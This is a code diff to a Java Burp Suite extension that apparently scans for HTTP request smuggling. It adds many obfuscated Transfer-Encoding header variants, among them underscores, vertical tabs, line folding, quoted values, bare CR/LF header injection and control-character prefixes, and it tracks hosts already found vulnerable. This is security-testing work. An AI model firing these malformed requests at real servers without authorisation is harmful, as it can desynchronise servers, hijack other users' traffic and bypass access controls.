@@ -1,10 +1,8 @@
 package burp;
 
-import com.sun.deploy.uitoolkit.impl.awt.UIToolkitImpl;
-
-import javax.rmi.CORBA.Util;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
@@ -19,7 +17,8 @@ public abstract class SmuggleScanBox extends Scan {
         super(name);
         supportedPermutations = new HashSet<>();
         registerPermutation("vanilla");
-        registerPermutation("underscore1");
+        registerPermutation("underjoin1");
+        registerPermutation("spacejoin1");
         registerPermutation("underscore2");
         registerPermutation("space1");
         registerPermutation("space2");
@@ -27,17 +26,32 @@ public abstract class SmuggleScanBox extends Scan {
         registerPermutation("valueprefix1");
         registerPermutation("nospace1");
         registerPermutation("tabprefix1");
+        registerPermutation("vertprefix1");
         registerPermutation("commaCow");
         registerPermutation("cowComma");
         registerPermutation("contentEnc");
+        registerPermutation("linewrapped1");
+        registerPermutation("gareth1");
+        registerPermutation("quoted");
+        registerPermutation("aposed");
+        registerPermutation("badwrap");
+        registerPermutation("badsetupCR");
+        registerPermutation("badsetupLF");
+        registerPermutation("vertwrap");
+        registerPermutation("tabwrap");
 
-        Utilities.globalSettings.registerSetting("convert POST to GET", true);
+        for(int i: getSpecialChars()) {
+            registerPermutation("prefix1:"+i);
+        }
+
+
+        Utilities.globalSettings.registerSetting("convert GET to POST", true);
         Utilities.globalSettings.registerSetting("report dodgy findings", false);
     }
 
     byte[] setupRequest(byte[] baseReq) {
         if (baseReq[0] == 'G') {
-            if (Utilities.globalSettings.getBoolean("convert POST to GET")) {
+            if (Utilities.globalSettings.getBoolean("convert GET to POST")) {
                 baseReq = Utilities.helpers.toggleRequestMethod(baseReq);
             }
             else {
@@ -58,6 +72,7 @@ public abstract class SmuggleScanBox extends Scan {
             config = new HashMap<>();
             config.put("vanilla", true);
             if (doConfiguredScan(baseReq, service, config)) {
+                BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
                 return null;
             }
         }
@@ -66,9 +81,18 @@ public abstract class SmuggleScanBox extends Scan {
             if (!Utilities.globalSettings.getBoolean(PERMUTE_PREFIX+permutation)) {
                 continue;
             }
+
+            String key = permutation+service.getProtocol()+service.getHost();
+            if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(key)) {
+                continue;
+            }
+
             config = new HashMap<>();
             config.put(permutation, true);
-            doConfiguredScan(baseReq, service, config);
+            boolean worked = doConfiguredScan(baseReq, service, config);
+            if (worked) {
+                BurpExtender.hostsToSkip.putIfAbsent(key, true);
+            }
         }
         return null;
     }
@@ -164,6 +188,19 @@ public abstract class SmuggleScanBox extends Scan {
         }
     }
 
+    static ArrayList<Integer> getSpecialChars() {
+        ArrayList<Integer> chars = new ArrayList<>();
+//        for (int i=0;i<32;i++) {
+//            chars.add(i);
+//        }
+//        chars.add(127);
+        chars.add(9);
+        chars.add(11);
+        chars.add(12);
+        chars.add(13);
+        return chars;
+    }
+
     static Resp buildPoc(byte[] req, IHttpService service, HashMap<String, Boolean> config) {
         try {
             byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
@@ -209,8 +246,10 @@ public abstract class SmuggleScanBox extends Scan {
         byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
 
 
-        if (settings.containsKey("underscore1")) {
+        if (settings.containsKey("underjoin1")) {
             chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer_Encoding".getBytes());
+        } else if (settings.containsKey("spacejoin1")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer Encoding".getBytes());
         }
         else if (settings.containsKey("space1")) {
             chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer-Encoding ".getBytes());
@@ -235,6 +274,35 @@ public abstract class SmuggleScanBox extends Scan {
         }
         else if (settings.containsKey("contentEnc")) {
             chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Content-Encoding: ".getBytes());
+        }  else if (settings.containsKey("vertprefix1")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\u000B".getBytes());
+        } else if (settings.containsKey("linewrapped1")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding:\n ".getBytes());
+        } else if (settings.containsKey("gareth1")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding\n : ".getBytes());
+        } else if (settings.containsKey("quoted")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: \"chunked\"".getBytes());
+        } else if (settings.containsKey("aposed")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: 'chunked'".getBytes());
+        } else if (settings.containsKey("badwrap")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
+            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\n Transfer-Encoding: chunked\r\n".getBytes());
+        } else if (settings.containsKey("badsetupCR")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
+            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n".getBytes());
+        } else if (settings.containsKey("badsetupLF")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: chunked".getBytes(), "Foo: bar".getBytes());
+            chunkedReq = Utilities.replace(chunkedReq, "HTTP/1.1\r\n".getBytes(), "HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n".getBytes());
+        } else if (settings.containsKey("vertwrap")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\u000B".getBytes());
+        } else if (settings.containsKey("tabwrap")) {
+            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: \n\t".getBytes());
+        }
+
+        for (int i: getSpecialChars()) {
+            if (settings.containsKey("prefix1:"+i)) {
+                chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding: ".getBytes(), ("Transfer-Encoding:"+(char) i).getBytes());
+            }
         }
 
         int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
